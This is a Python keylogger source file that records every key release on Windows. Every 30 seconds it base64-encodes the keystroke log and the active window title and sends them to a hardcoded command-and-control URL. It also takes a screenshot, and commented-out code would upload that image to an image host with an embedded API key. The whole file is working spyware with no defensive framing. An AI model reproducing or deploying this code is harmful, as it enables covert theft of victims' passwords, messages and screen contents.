import keyboard
from threading import Timer
from base64 import b64encode
import requests

import io
import pyautogui
from win32gui import GetWindowText, GetForegroundWindow

C2_URL = "https://eoa4ez9h9j2owkg.m.pipedream.net"

KEY_IMG_BB ="dfa808d7dee667d55d7532562df016ca"
IMG_BB_URL ="https://api.imgbb.com/1/upload"

class Keylogger:

    def __init__(self, interval):
        self.interval = interval
        self.log = ''

    def callback(self, event):
        # key UP is occured
        name = event.name
        if len(name) > 1:
            name = name.replace('', '_')
            name = name.upper()
            name = '[{}]'.format(name)

        self.log += name

    def send_server(self):
        leaked_bytes = (self.log).encode('ascii')
        leaked_info = b64encode(leaked_bytes)

        process_text=GetWindowText(GetForegroundWindow())
        leaked_process= (process_text).encode("utf-8")
        leaked_process = b64encode(leaked_process)
        params = {'k':leaked_info, "p":leaked_process}
        res = requests.get(C2_URL, params=params)


        screenshot=pyautogui.screenshot()
        # img_bytes = io.BytesIO()
        # screenshot.save(img_bytes, format="PNG")
        # img_bytes=img_bytes.getvalue()
        # img_encoded = b64encode(img_bytes)
        # payload = {"key": KEY_IMG_BB, "image":img_encoded}
        # res = requests.post(IMG_BB_URL, payload)
        # print(res.ok)
        

    def report(self):        # key입력시 30초마다, 미입력시 no report
        if self.log != '':
            self.send_server()

        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=30)      # 30초마다
    keylogger.start()